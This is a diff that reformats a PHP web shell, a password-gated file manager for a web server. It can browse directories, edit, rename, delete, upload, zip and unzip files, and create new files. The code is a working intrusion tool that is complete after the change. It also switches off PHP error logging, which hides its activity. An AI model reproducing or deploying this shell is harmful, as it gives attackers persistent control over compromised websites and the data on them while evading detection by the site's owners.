@@ -2,8 +2,9 @@
 session_start();
 set_time_limit(0);
 $password = '$2y$10$HI5sBrenjZyy88tGWKnCwOLnHf09C5LfLcz09Qe9ZK8M4oLBqXDrO';
-function login() {
-	?>
+function login()
+{
+    ?>
 	<meta name="viewport" content="width=device-width, initial-scale=1">
 	<style type="text/css">
 		@import url('https://fonts.googleapis.com/css2?family=Pangolin&display=swap');
@@ -65,19 +66,24 @@ function login() {
 			</tbody>
 		</table>
 	</form>
-	<?php
-	exit();
+	<?php exit();
 }
-function logout() {
-	unset($_SESSION['login']);
-	?> <script>window.location='http://<?= $_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'] ?>'</script> <?php
+function logout()
+{
+    unset($_SESSION['login']); ?> <script>window.location='http://<?= $_SERVER[
+     'HTTP_HOST'
+ ] . $_SERVER['PHP_SELF'] ?>'</script> <?php
 }
 if (!isset($_SESSION['login'])) {
-	if (empty($password) || (isset($_POST['password']) && (password_verify($_POST['password'], $password)))) {
-		$_SESSION['login'] = true;
-	} else {
-		login();
-	}
+    if (
+        empty($password) ||
+        (isset($_POST['password']) &&
+            password_verify($_POST['password'], $password))
+    ) {
+        $_SESSION['login'] = true;
+    } else {
+        login();
+    }
 }
 ?>
 <title><?= get_current_user() ?></title>
@@ -441,28 +447,28 @@ if (!isset($_SESSION['login'])) {
 <table align="center" width="60%">
 <?php
 date_default_timezone_set('Asia/Jakarta');
-function cwd() {
-	if (isset($_POST['dir'])) {
-		$cwd = $_POST['dir'];
-		chdir($cwd);
-	} else {
-		$cwd = str_replace('\\', DIRECTORY_SEPARATOR, getcwd());
-	} return str_replace('\\\\', DIRECTORY_SEPARATOR, $cwd);
+function cwd()
+{
+    if (isset($_POST['dir'])) {
+        $cwd = $_POST['dir'];
+        chdir($cwd);
+    } else {
+        $cwd = str_replace('\\', DIRECTORY_SEPARATOR, getcwd());
+    }
+    return str_replace('\\\\', DIRECTORY_SEPARATOR, $cwd);
 }
 $file = new Files();
 switch (@$_POST['action']) {
-	case 'rename':
-		if (isset($_POST['newname'])) {
-			$rename = $file->renames($_POST['file'], $_POST['newname']);
-			if ($rename) {
-				print("<script>alert('rename success')</script>");
-			} else {
-				print("<script>alert('rename failed')</script>");
-			}
-		}
-		switch ($_POST['file']) {
-			case @filetype($_POST['file']) == 'dir' :
-				?>
+    case 'rename':
+        if (isset($_POST['newname'])) {
+            $rename = $file->renames($_POST['file'], $_POST['newname']);
+            if ($rename) {
+                print "<script>alert('rename success')</script>";
+            } else {
+                print "<script>alert('rename failed')</script>";
+            }
+        }
+        switch ($_POST['file']) { case @filetype($_POST['file']) == 'dir': ?>
 				<tr>
 					<th colspan="4">
 						<span class="action">RENAME</span>
@@ -483,7 +489,7 @@ switch (@$_POST['action']) {
 					</td>
 					<td class="no-border"><center>:</center></td>
 					<td class="no-border">
-						<?= date ("F d Y H:i:s.", filemtime($_POST['file'])) ?>
+						<?= date("F d Y H:i:s.", filemtime($_POST['file'])) ?>
 					</td>
 				</tr>
 				<tr>
@@ -495,7 +501,7 @@ switch (@$_POST['action']) {
 								<option value="rename" selected>RENAME</option>
 							</select>
 							<input type="hidden" name="dirs" value="<?= $_POST['dirs'] ?>">
-							<input type="hidden" name="file" value="<?=$_POST['file']?>">
+							<input type="hidden" name="file" value="<?= $_POST['file'] ?>">
 						</td>
 					</form>
 				</tr>
@@ -506,15 +512,11 @@ switch (@$_POST['action']) {
 						<td class="no-border" colspan="3">
 							<input type="submit">
 							<input type="hidden" name="action" value="rename">
-							<input type="hidden" name="file" value="<?=$_POST['file']?>">
+							<input type="hidden" name="file" value="<?= $_POST['file'] ?>">
 						</td>
 					</form>
 				</tr>
-				<?php
-				break;
-			
-			case @filetype($_POST['file']) == 'file' :
-				?>
+				<?php break;case @filetype($_POST['file']) == 'file': ?>
 				<tr>
 					<th colspan="4">
 						<span class="action">RENAME</span>
@@ -535,7 +537,7 @@ switch (@$_POST['action']) {
 					</td>
 					<td class="no-border"><center>:</center></td>
 					<td class="no-border">
-						<?= date ("F d Y H:i:s.", filemtime($_POST['file'])) ?>
+						<?= date("F d Y H:i:s.", filemtime($_POST['file'])) ?>
 					</td>
 				</tr>
 				<tr>
@@ -548,7 +550,7 @@ switch (@$_POST['action']) {
 								<option value="rename" selected>RENAME</option>
 							</select>
 							<input type="hidden" name="dirs" value="<?= $_POST['dirs'] ?>">
-							<input type="hidden" name="file" value="<?=$_POST['file']?>">
+							<input type="hidden" name="file" value="<?= $_POST['file'] ?>">
 						</td>
 					</form>
 				</tr>
@@ -559,32 +561,27 @@ switch (@$_POST['action']) {
 						<td class="no-border" colspan="3">
 							<input type="submit" name="submit">
 							<input type="hidden" name="action" value="rename">
-							<input type="hidden" name="file" value="<?=$_POST['file']?>">
+							<input type="hidden" name="file" value="<?= $_POST['file'] ?>">
 						</td>
 					</form>
 				</tr>
-				<?php
-				break;
-		}
-		exit();
-		break;
-	case 'edit':
-		?>
+				<?php break;}
+        exit();
+        break;
+    case 'edit': ?>
 		<tr>
 			<th colspan="3">
 				<span class="action">EDIT</span>
 			</th>
 		</tr>
-		<?php
-		if (isset($_POST['submit'])) {
-			$edit = $file->edit($_POST['file'], $_POST['text']);
-			if ($edit) {
-				print("<script>alert('edit failed')</script>");
-			} else {
-				print("<script>alert('edit success')</script>");
-			}
-		}
-		?>
+		<?php if (isset($_POST['submit'])) {
+      $edit = $file->edit($_POST['file'], $_POST['text']);
+      if ($edit) {
+          print "<script>alert('edit failed')</script>";
+      } else {
+          print "<script>alert('edit success')</script>";
+      }
+  } ?>
 		<tr>
 			<td class="no-border" style="width:100px;">
 				Filename
@@ -600,13 +597,17 @@ switch (@$_POST['action']) {
 			</td>
 			<td class="no-border"><center>:</center></td>
 			<td class="no-border">
-				<?= date ("F d Y H:i:s.", filemtime($_POST['file'])) ?>
+				<?= date("F d Y H:i:s.", filemtime($_POST['file'])) ?>
 			</td>
 		</tr>
 		<tr>
 			<form method="post">
 				<td colspan="2">
-					<button style="float: left;" name="dir" value="<?= str_replace(basename($_POST['file']), '', $_POST['file']) ?>">
+					<button style="float: left;" name="dir" value="<?= str_replace(
+         basename($_POST['file']),
+         '',
+         $_POST['file']
+     ) ?>">
 						<img src="https://image.flaticon.com/icons/svg/271/271218.svg" class="icon">
 					</button>
 				</td>
@@ -620,49 +621,48 @@ switch (@$_POST['action']) {
 						<option value="rename">RENAME</option>
 					</select>
 					<input type="hidden" name="dirs" value="<?= $_POST['dirs'] ?>">
-					<input type="hidden" name="file" value="<?=$_POST['file']?>">
+					<input type="hidden" name="file" value="<?= $_POST['file'] ?>">
 				</td>
 			</form>
 		</tr>
 		<tr>
 			<form method="post">
 				<td class="no-border" colspan="3">
-					<textarea name="text"><?= htmlspecialchars(file_get_contents($_POST['file'])) ?></textarea>
+					<textarea name="text"><?= htmlspecialchars(
+         file_get_contents($_POST['file'])
+     ) ?></textarea>
 				</td>
 		</tr>
 		<tr>
 			<td class="no-border" colspan="3">
 				<input type="submit" name="submit" value="EDIT">
 				<input type="hidden" name="action" value="edit">
-				<input type="hidden" name="file" value="<?=$_POST['file']?>">
+				<input type="hidden" name="file" value="<?= $_POST['file'] ?>">
 			</td>
 		</tr>
 		</form>
 		<?php
-		exit();
-		break;
-	case 'delete':
-		if ($file->delete($_POST['file'])) {
-			if (isset($_POST['dirs'])) {
-				chdir(str_replace(basename($_POST['file']), '', $_POST['file']));
-			}
-		} else {
-			print("<script>alert('delete failed')</script>");
-		}
-		?>
+  exit();
+  break;
+  case 'delete':
+        if ($file->delete($_POST['file'])) {
+            if (isset($_POST['dirs'])) {
+                chdir(
+                    str_replace(basename($_POST['file']), '', $_POST['file'])
+                );
+            }
+        } else {
+            print "<script>alert('delete failed')</script>";
+        } ?>
 		<input type="hidden" name="dirs" value="<?= $_POST['dirs'] ?>">
-		<?php
-		break;
-	case 'back':
-		if (isset($_POST['dirs'])) {
-			chdir(str_replace(basename($_POST['file']), '', $_POST['file']));
-		}
-		?>
+		<?php break;
+    case 'back':
+        if (isset($_POST['dirs'])) {
+            chdir(str_replace(basename($_POST['file']), '', $_POST['file']));
+        } ?>
 		<input type="hidden" name="dirs" value="<?= $_POST['dirs'] ?>">
-		<?php
-		break;
-	case 'upload':
-		?>
+		<?php break;
+    case 'upload': ?>
 		<tr>
 			<th colspan="2">
 				<span class="action">UPLOAD FILE</span>
@@ -671,7 +671,11 @@ switch (@$_POST['action']) {
 		<tr>
 			<td>
 				<form method="post" enctype="multipart/form-data">
-					<input type="hidden" name="destination" value="<?= str_replace(basename($_POST['destination']), '', $_POST['destination']) ?>">
+					<input type="hidden" name="destination" value="<?= str_replace(
+         basename($_POST['destination']),
+         '',
+         $_POST['destination']
+     ) ?>">
 					<div class="upload-btn-wrapper">
 						<button class="btn">Choose file</button>
 						<input type="file" name="file[]" multiple>
@@ -684,20 +688,26 @@ switch (@$_POST['action']) {
 			</td>
 		</tr>
 		<?php
-		if (isset($_POST['submit'])) {
-			$file = count($_FILES['file']['tmp_name']);
-			for ($i=0; $i < $file ; $i++) { 
-				if (copy($_FILES['file']['tmp_name'][$i], $_POST['destination'].DIRECTORY_SEPARATOR.$_FILES['file']['name'][$i])) {
-					print("<script>alert('Uploaded  success')</script>");
-				} else {
-					print("<script>alert('Upload failed')</script>");
-				}
-			}
-		}
-		exit();
-		break;
-	case 'making':
-		?>
+  if (isset($_POST['submit'])) {
+      $file = count($_FILES['file']['tmp_name']);
+      for ($i = 0; $i < $file; $i++) {
+          if (
+              copy(
+                  $_FILES['file']['tmp_name'][$i],
+                  $_POST['destination'] .
+                      DIRECTORY_SEPARATOR .
+                      $_FILES['file']['name'][$i]
+              )
+          ) {
+              print "<script>alert('Uploaded  success')</script>";
+          } else {
+              print "<script>alert('Upload failed')</script>";
+          }
+      }
+  }
+  exit();
+  break;
+  case 'making': ?>
 		<tr>
 			<th>
 				<span style="font-weight:bold;font-size:25px;">CREATE FILE & DIRECTORY</span>
@@ -726,60 +736,90 @@ switch (@$_POST['action']) {
 				<td>
 					<input type="submit" name="submit">
 					<input type="hidden" name="action" value="making">
-					<input type="hidden" name="destination" value="<?= str_replace(basename($_POST['destination']), '', $_POST['destination']) ?>">
+					<input type="hidden" name="destination" value="<?= str_replace(
+         basename($_POST['destination']),
+         '',
+         $_POST['destination']
+     ) ?>">
 				</td>
 			</tr>
 		</form>
 		<?php
-		if (isset($_POST['submit'])) {
-			switch ($_POST['type']) {
-				case 'file':
-					if ($file->making($_POST['destination'].DIRECTORY_SEPARATOR.$_POST['filename'], $_POST['text'], "file")) {
-						print("<script>alert('making file <u>".$_POST['filename']."</u> failed')</script>");
-					} else {
-						print("<script>alert('making file <u>".$_POST['filename']."</u> success')</script>");
-					}
-					break;
-				
-				case 'dir':
-					if ($file->making($_POST['destination'].DIRECTORY_SEPARATOR.$_POST['filename'], '', "dir")) {
-						print("<script>alert('making dir <u>".$_POST['filename']."</u> failed')</script>");
-					} else {
-						print("<script>alert('making dir <u>".$_POST['filename']."</u> success')</script>");
-					}
-					break;
-			}
-		}
-		exit();
-		break;
-	case 'backup':
-		$file->backup($_POST['file']);
-		break;
-	case 'logout':
-		logout();
-		break;
+  if (isset($_POST['submit'])) {
+      switch ($_POST['type']) {
+          case 'file':
+              if (
+                  $file->making(
+                      $_POST['destination'] .
+                          DIRECTORY_SEPARATOR .
+                          $_POST['filename'],
+                      $_POST['text'],
+                      "file"
+                  )
+              ) {
+                  print "<script>alert('making file <u>" .
+                      $_POST['filename'] .
+                      "</u> failed')</script>";
+              } else {
+                  print "<script>alert('making file <u>" .
+                      $_POST['filename'] .
+                      "</u> success')</script>";
+              }
+              break;
+
+          case 'dir':
+              if (
+                  $file->making(
+                      $_POST['destination'] .
+                          DIRECTORY_SEPARATOR .
+                          $_POST['filename'],
+                      '',
+                      "dir"
+                  )
+              ) {
+                  print "<script>alert('making dir <u>" .
+                      $_POST['filename'] .
+                      "</u> failed')</script>";
+              } else {
+                  print "<script>alert('making dir <u>" .
+                      $_POST['filename'] .
+                      "</u> success')</script>";
+              }
+              break;
+      }
+  }
+  exit();
+  break;
+  case 'backup':
+        $file->backup($_POST['file']);
+        break;
+    case 'logout':
+        logout();
+        break;
 }
 ?>
 <tr>
 	<form method="post">
 		<th colspan="6">
 			<center>
-				<?php
-				foreach (scandir(cwd()) as $value) {
-					if (is_dir($value) || $value === '.' || $value === '..') continue;
-					?> <button style="float: left;" name="dir" value="<?= dirname(cwd()) ?>">
+				<?php foreach (scandir(cwd()) as $value) {
+        if (is_dir($value) || $value === '.' || $value === '..') {
+            continue;
+        } ?> <button style="float: left;" name="dir" value="<?= dirname(
+     cwd()
+ ) ?>">
 							<img src="https://image.flaticon.com/icons/svg/271/271218.svg" class="icon">
 					   </button>
 					   <button class="tools" name="action" value="upload">UPLOAD</button>
 					   <button class="tools" name="action" value="making">MAKING FILES</button>
 					   <button class="tools rw" name="" value="">REWRITE</button>
 					   <button class="tools br" name="action" value="logout">LOGOUT</button>
-					   <input type="hidden" name="destination" value="<?= cwd().DIRECTORY_SEPARATOR.$value ?>"><?php
-					if ($value = 1) {
-						break;
-					}
-				}
-				?>
+					   <input type="hidden" name="destination" value="<?= cwd() .
+            DIRECTORY_SEPARATOR .
+            $value ?>"><?php if ($value = 1) {
+    break;
+}
+    } ?>
 				
 			</center>
 		</th>
@@ -788,8 +828,7 @@ switch (@$_POST['action']) {
 <?php
 $iterator = new DirectoryIterator(cwd());
 foreach ($iterator as $dir) {
-	if ($dir->isDir() && $dir != '.' && $dir != '..') {
-		?>
+    if ($dir->isDir() && $dir != '.' && $dir != '..') { ?>
 		<tr>
 			<td>
 				<label class='container'>
@@ -802,7 +841,9 @@ foreach ($iterator as $dir) {
 			</td>
 			<form method="post">
 			<td>
-				<button name="dir" value="<?=cwd().DIRECTORY_SEPARATOR.$dir->getFilename()?>">
+				<button name="dir" value="<?= cwd() .
+        DIRECTORY_SEPARATOR .
+        $dir->getFilename() ?>">
 					<?= basename($dir->getPathname()) ?>
 				</button>
 			</td>
@@ -829,12 +870,10 @@ foreach ($iterator as $dir) {
 				</td>
 			</form>
 		</tr>
-		<?php
-	}
+		<?php }
 }
 foreach ($iterator as $files) {
-	if ($files->isFile()) {
-		?>
+    if ($files->isFile()) { ?>
 		<tr>
 			<td style="width:1%;">
 				<label class='container'>
@@ -846,13 +885,19 @@ foreach ($iterator as $files) {
 				<?= $file->img($files->getPathname()) ?>
 			</td>
 			<td>
-				<a href="http://<?=str_replace($_SERVER['DOCUMENT_ROOT'], $_SERVER['HTTP_HOST'], cwd()).DIRECTORY_SEPARATOR.basename($files->getPathname())?>" target='_blank'>
-					<button><?=basename($files->getPathname())?></button>
+				<a href="http://<?= str_replace(
+        $_SERVER['DOCUMENT_ROOT'],
+        $_SERVER['HTTP_HOST'],
+        cwd()
+    ) .
+        DIRECTORY_SEPARATOR .
+        basename($files->getPathname()) ?>" target='_blank'>
+					<button><?= basename($files->getPathname()) ?></button>
 				</a>
 			</td>
 			<td class="scrren">
 				<center>
-					<?=$file->size($files)?>
+					<?= $file->size($files) ?>
 				</center>
 			</td>
 			<td class="scrren">
@@ -863,10 +908,10 @@ foreach ($iterator as $files) {
 			<form method="post">
 				<td class="act">
 					<?php
-					$exttension = strtolower(pathinfo($files->getPathname(), PATHINFO_EXTENSION));
-					switch ($exttension) {
-						case 'zip':
-							?>
+     $exttension = strtolower(
+         pathinfo($files->getPathname(), PATHINFO_EXTENSION)
+     );
+     switch ($exttension) { case 'zip': ?>
 							<select class="action" name="action" onchange='if(this.value != 0) { this.form.submit(); }'>
 								<option selected>CHOOSE</option>
 								<option value="extract">UNZIP</option>
@@ -875,15 +920,12 @@ foreach ($iterator as $files) {
 							</select>
 							<input type="hidden" name="file" value="<?= $files->getPathname() ?>">
 							<input type="hidden" name="dirs" value="<?= cwd() ?>">
-							<?php
-							break;
-						case 'png':
-						case 'jpg':
-						case 'jpeg':
-						case 'gif':
-						case 'bmp':
-						case 'ico':
-							?>
+							<?php break;case 'png':
+         case 'jpg':
+         case 'jpeg':
+         case 'gif':
+         case 'bmp':
+         case 'ico': ?>
 							<select class="action" name="action" onchange='if(this.value != 0) { this.form.submit(); }'>
 								<option selected>CHOOSE</option>
 								<option value="delete">DELETE</option>
@@ -891,11 +933,7 @@ foreach ($iterator as $files) {
 							</select>
 							<input type="hidden" name="file" value="<?= $files->getPathname() ?>">
 							<input type="hidden" name="dirs" value="<?= cwd() ?>">
-							<?php
-							break;
-						
-						default:
-							?>
+							<?php break;default: ?>
 							<select class="action" name="action" onchange='if(this.value != 0) { this.form.submit(); }'>
 								<option selected>CHOOSE</option>
 								<option value="edit">EDIT</option>
@@ -905,207 +943,235 @@ foreach ($iterator as $files) {
 							</select>
 							<input type="hidden" name="file" value="<?= $files->getPathname() ?>">
 							<input type="hidden" name="dirs" value="<?= cwd() ?>">
-							<?php
-							break;
-					}
-					?>
+							<?php break;}
+     ?>
 				</td>
 			</form>
 		</tr>
-		<?php
-	}
+		<?php }
 }
-class Files {
-	public $path;
+class Files
+{
+    public $path;
     public $options;
     public $filesystem;
     public $directories;
     public $files;
     public $text;
 
-    function pwd() {
-    	$dir = explode(DIRECTORY_SEPARATOR, cwd());
-    	foreach ($dir as $key => $pwd) {
-    		print("<button name='dir' value='");
-    		for ($i=0; $i <= $key ; $i++) { 
-    			print($dir[$i]);
-    			if ($i != $key) {
-    				print(DIRECTORY_SEPARATOR);
-    			}
-    		} print("'>{$pwd}</button><button>/</button>");
-    	}
+    function pwd()
+    {
+        $dir = explode(DIRECTORY_SEPARATOR, cwd());
+        foreach ($dir as $key => $pwd) {
+            print "<button name='dir' value='";
+            for ($i = 0; $i <= $key; $i++) {
+                print $dir[$i];
+                if ($i != $key) {
+                    print DIRECTORY_SEPARATOR;
+                }
+            }
+            print "'>{$pwd}</button><button>/</button>";
+        }
     }
 
-    function permission_file($filename, $perms) {
-    	if (is_writable($filename)) {
-    		?> <font color="green"><?= $perms ?></font> <?php
-    	} else {
-    		?> <font color="red"><?= $perms ?></font> <?php
-    	}
+    function permission_file($filename, $perms)
+    {
+        if (
+            is_writable($filename)
+        ) { ?> <font color="green"><?= $perms ?></font> <?php } else { ?> <font color="red"><?= $perms ?></font> <?php }
     }
 
-    function permission($filename) {
-    	if (is_writable($filename)) {
-    		?> <font color="green">writable</font> <?php
-    	} else {
-    		?> <font color="red">not writable</font> <?php
-    	}
+    function permission($filename)
+    {
+        if (
+            is_writable($filename)
+        ) { ?> <font color="green">writable</font> <?php } else { ?> <font color="red">not writable</font> <?php }
     }
 
-    function size($file) {
-    	$this->discovery($file);
+    function size($file)
+    {
+        $this->discovery($file);
 
-    	if (is_file($file)) {
-    		$filePath = $file;
+        if (is_file($file)) {
+            $filePath = $file;
             if (!realpath($filePath)) {
-              $filePath = $_SERVER["DOCUMENT_ROOT"].$filePath;
+                $filePath = $_SERVER["DOCUMENT_ROOT"] . $filePath;
             }
             $fileSize = filesize($filePath);
-            $sizes = array("TB","GB","MB","KB","Byte");
+            $sizes = ["TB", "GB", "MB", "KB", "Byte"];
             $total = count($sizes);
             while ($total-- && $fileSize > 1024) {
-            	$fileSize /= 1024;
-            } return round($fileSize, 2)." ".$sizes[$total];
-        } return false;
+                $fileSize /= 1024;
+            }
+            return round($fileSize, 2) . " " . $sizes[$total];
+        }
+        return false;
     }
 
-    function img($filename) {
-    	print("<img class='icon' src='");
-    	$ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
-    	switch ($ext) {
-    		case 'php':
-    		case 'php1':
-    		case 'php2':
-    		case 'php3':
-    		case 'php4':
-    		case 'php5':
-    		case 'php6':
-    		case 'phtml':
-    			print("https://image.flaticon.com/icons/png/128/337/337947.png");
-    			break;
-    		case 'html':
-    			print("https://image.flaticon.com/icons/png/128/136/136528.png");
-    			break;
-    		case 'pdf':
-    			print("https://image.flaticon.com/icons/png/128/136/136522.png");
-    			break;
-    		case 'css':
-    			print("https://image.flaticon.com/icons/png/128/136/136527.png");
-    			break;
-    		case 'ico':
-    			print("https://image.flaticon.com/icons/png/128/1126/1126873.png");
-    			break;
-    		case 'png':
-    			print("https://image.flaticon.com/icons/png/128/136/136523.png");
-    			break;
-    		case 'txt':
-    			print("https://image.flaticon.com/icons/png/128/136/136538.png");
-    			break;
-    		default:
-    			print("https://image.flaticon.com/icons/svg/833/833524.svg");
-    			break;
-    	} print("'></img>");
+    function img($filename)
+    {
+        print "<img class='icon' src='";
+        $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
+        switch ($ext) {
+            case 'php':
+            case 'php1':
+            case 'php2':
+            case 'php3':
+            case 'php4':
+            case 'php5':
+            case 'php6':
+            case 'phtml':
+                print "https://image.flaticon.com/icons/png/128/337/337947.png";
+                break;
+            case 'html':
+                print "https://image.flaticon.com/icons/png/128/136/136528.png";
+                break;
+            case 'pdf':
+                print "https://image.flaticon.com/icons/png/128/136/136522.png";
+                break;
+            case 'css':
+                print "https://image.flaticon.com/icons/png/128/136/136527.png";
+                break;
+            case 'ico':
+                print "https://image.flaticon.com/icons/png/128/1126/1126873.png";
+                break;
+            case 'png':
+                print "https://image.flaticon.com/icons/png/128/136/136523.png";
+                break;
+            case 'txt':
+                print "https://image.flaticon.com/icons/png/128/136/136538.png";
+                break;
+            default:
+                print "https://image.flaticon.com/icons/svg/833/833524.svg";
+                break;
+        }
+        print "'></img>";
     }
 
-    function unzip($source, $destination) {
-    	$zip = new ZipArchive();
-    	if ($zip->open($source) === true) {
-    		$zip->extractTo($destination);
-    		$zip->close();
-    	}
-	}
-
-	function zip($source, $destination) {
-		if (extension_loaded('zip')) {
-			if (file_exists($source)) {
-				$zip = new ZipArchive();
-				if ($zip->open($destination, ZIPARCHIVE::CREATE)) {
-					if (is_dir($source)) {
-						$iterator = new RecursiveDirectoryIterator($source);
-						// skip dot files while iterating 
-						$iterator->setFlags(RecursiveDirectoryIterator::SKIP_DOTS);
-						$files = new RecursiveIteratorIterator($iterator, RecursiveIteratorIterator::SELF_FIRST);
-						foreach ($files as $file) {
-							$root = $_SERVER['DOCUMENT_ROOT'];
-							if (is_dir($file)) {
-								$zip->addEmptyDir(str_replace($root, '', $file . '/'));
-							} else if (is_file($file)) {
-								$zip->addFromString(str_replace($root, '',  $file), file_get_contents($file));
-							}
-						}
-					} else if (is_file($source)) {
-						$zip->addFromString(basename($source), file_get_contents($source));
-					}
-				}
-				return $zip->close();
-			}
-		}
-		return false;
-	}
-
-	function making($filename, $text, $name = null) {
-		if ($name === 'file') {
-			$handle = fopen($filename, 'w');
-			fwrite($handle, $text);
-			fclose($handle);
-		} elseif ($name === 'dir') {
-			return (!mkdir($filename, 0777) && !is_dir($filename));
-		}
-	}
-
-	function delete($path) {
-		if (file_exists($path)) {
-		} else {
-			return;
-		}
-
-		$this->discovery($path);
-		if (count($this->files) > 0) {
-			foreach ($this->files as $file) {
-				unlink($file);
-			}
-		}
-		if (count($this->directories) > 0) {
-			arsort($this->directories);
-
-			foreach ($this->directories as $directory) {
-				if (basename($directory) == '.' || basename($directory) == '..') {
-				} else {
-					rmdir($directory);
-				}
-			}
-		} return;
-	}
-
-	function edit($path, $text)  {
-    	$this->discovery($path);
-
-    	if (is_file($path)) {
-    		$handle = fopen($path, "w");
-    		fwrite($handle, $text);
-    		fclose($handle);
-    		return false;
-    	} else {
-    		return false;
-    	}
+    function unzip($source, $destination)
+    {
+        $zip = new ZipArchive();
+        if ($zip->open($source) === true) {
+            $zip->extractTo($destination);
+            $zip->close();
+        }
     }
 
-    function backup($file) {
-    	$this->discovery($file);
-
-    	$handle = fopen($file.".bak", "w");
-    	fwrite($handle, file_get_contents($file));
-    	fclose($handle);
+    function zip($source, $destination)
+    {
+        if (extension_loaded('zip')) {
+            if (file_exists($source)) {
+                $zip = new ZipArchive();
+                if ($zip->open($destination, ZIPARCHIVE::CREATE)) {
+                    if (is_dir($source)) {
+                        $iterator = new RecursiveDirectoryIterator($source);
+                        // skip dot files while iterating
+                        $iterator->setFlags(
+                            RecursiveDirectoryIterator::SKIP_DOTS
+                        );
+                        $files = new RecursiveIteratorIterator(
+                            $iterator,
+                            RecursiveIteratorIterator::SELF_FIRST
+                        );
+                        foreach ($files as $file) {
+                            $root = $_SERVER['DOCUMENT_ROOT'];
+                            if (is_dir($file)) {
+                                $zip->addEmptyDir(
+                                    str_replace($root, '', $file . '/')
+                                );
+                            } elseif (is_file($file)) {
+                                $zip->addFromString(
+                                    str_replace($root, '', $file),
+                                    file_get_contents($file)
+                                );
+                            }
+                        }
+                    } elseif (is_file($source)) {
+                        $zip->addFromString(
+                            basename($source),
+                            file_get_contents($source)
+                        );
+                    }
+                }
+                return $zip->close();
+            }
+        }
+        return false;
     }
 
-    function renames($filename, $newname) {
-    	$this->discovery($filename);
-    	return rename($filename, $newname);
+    function making($filename, $text, $name = null)
+    {
+        if ($name === 'file') {
+            $handle = fopen($filename, 'w');
+            fwrite($handle, $text);
+            fclose($handle);
+        } elseif ($name === 'dir') {
+            return !mkdir($filename, 0777) && !is_dir($filename);
+        }
     }
 
-	function discovery($path) {
-        $this->directories = array();
-        $this->files       = array();
+    function delete($path)
+    {
+        if (file_exists($path)) {
+        } else {
+            return;
+        }
+
+        $this->discovery($path);
+        if (count($this->files) > 0) {
+            foreach ($this->files as $file) {
+                unlink($file);
+            }
+        }
+        if (count($this->directories) > 0) {
+            arsort($this->directories);
+
+            foreach ($this->directories as $directory) {
+                if (
+                    basename($directory) == '.' ||
+                    basename($directory) == '..'
+                ) {
+                } else {
+                    rmdir($directory);
+                }
+            }
+        }
+        return;
+    }
+
+    function edit($path, $text)
+    {
+        $this->discovery($path);
+
+        if (is_file($path)) {
+            $handle = fopen($path, "w");
+            fwrite($handle, $text);
+            fclose($handle);
+            return false;
+        } else {
+            return false;
+        }
+    }
+
+    function backup($file)
+    {
+        $this->discovery($file);
+
+        $handle = fopen($file . ".bak", "w");
+        fwrite($handle, file_get_contents($file));
+        fclose($handle);
+    }
+
+    function renames($filename, $newname)
+    {
+        $this->discovery($filename);
+        return rename($filename, $newname);
+    }
+
+    function discovery($path)
+    {
+        $this->directories = [];
+        $this->files = [];
 
         if (is_file($path)) {
             $this->files[] = $path;
@@ -1118,9 +1184,10 @@ class Files {
         }
 
         $this->directories[] = $path;
-        $objects = new RecursiveIteratorIterator (
+        $objects = new RecursiveIteratorIterator(
             new RecursiveDirectoryIterator($path),
-            RecursiveIteratorIterator::SELF_FIRST);
+            RecursiveIteratorIterator::SELF_FIRST
+        );
 
         foreach ($objects as $name => $object) {
             if (is_file($name)) {
@@ -1131,7 +1198,8 @@ class Files {
                     $this->directories[] = $name;
                 }
             }
-        } return;
+        }
+        return;
     }
 }
 ?>
@@ -1155,39 +1223,44 @@ class Files {
 	</td>
 	</form>
 </tr>
-<?php
-if (!empty($data = @$_POST['data'])) {
-	foreach ($data as $filename) {
-		switch ($_POST['mode']) {
-			case '1':
-				if ($file->delete($filename)) {
-					print("<script>alert('failed')</script>");
-				} else {
-					if (isset($_POST['dirs'])) {
-						chdir(str_replace(basename($filename), '', $filename));
-					}
-					?> <input type="hidden" name="dirs" value="<?= $_POST['dirs'] ?>"> <?php
-				}
-			break;
-			case '2':
-				?> <input type="hidden" name="dirs" value="<?= $_POST['dirs'] ?>"><?php
-				if ($file->zip(basename($filename), str_replace(basename($filename), '', $filename)."/backup.zip")) {
-					print("<script>alert('success zip')</script>");
-				} else {
-					print("<script>alert('failed zip')</script>");
-				}
-				break;
-			case 'backup':
-				if ($file->backup($filename)) {
-					print("<script>alert('failed')</script>");
-				} else {
-					print("<script>alert('success backup')</script>");
-				}
-				break;
-		}
-	}
+<?php if (!empty(($data = @$_POST['data']))) {
+    foreach ($data as $filename) {
+        switch ($_POST['mode']) {
+            case '1':
+                if ($file->delete($filename)) {
+                    print "<script>alert('failed')</script>";
+                } else {
+                    if (isset($_POST['dirs'])) {
+                        chdir(str_replace(basename($filename), '', $filename));
+                    } ?> <input type="hidden" name="dirs" value="<?= $_POST[
+     'dirs'
+ ] ?>"> <?php
+                }
+                break;
+            case '2': ?> <input type="hidden" name="dirs" value="<?= $_POST[
+     'dirs'
+ ] ?>"><?php
+if (
+    $file->zip(
+        basename($filename),
+        str_replace(basename($filename), '', $filename) . "/backup.zip"
+    )
+) {
+    print "<script>alert('success zip')</script>";
+} else {
+    print "<script>alert('failed zip')</script>";
 }
-?>
+break;
+case 'backup':
+                if ($file->backup($filename)) {
+                    print "<script>alert('failed')</script>";
+                } else {
+                    print "<script>alert('success backup')</script>";
+                }
+                break;
+        }
+    }
+} ?>
 <script type="text/javascript">
 	function checkAll(ele) {
 		var checkboxes = document.getElementsByTagName('input');
@@ -1207,16 +1280,15 @@ if (!empty($data = @$_POST['data'])) {
    	}
 </script>
 </table>
-<?php
-if(function_exists('ini_set')) {
-	ini_set("upload_max_filesize","300M");
-    ini_set('error_log',NULL);
-    ini_set('log_errors',0);
-    ini_set('file_uploads',1);
-    ini_set('allow_url_fopen',1);
-}else{
-    ini_alter('error_log',NULL);
-    ini_alter('log_errors',0);
-    ini_alter('file_uploads',1);
-    ini_alter('allow_url_fopen',1);
+<?php if (function_exists('ini_set')) {
+    ini_set("upload_max_filesize", "300M");
+    ini_set('error_log', null);
+    ini_set('log_errors', 0);
+    ini_set('file_uploads', 1);
+    ini_set('allow_url_fopen', 1);
+} else {
+    ini_alter('error_log', null);
+    ini_alter('log_errors', 0);
+    ini_alter('file_uploads', 1);
+    ini_alter('allow_url_fopen', 1);
 }
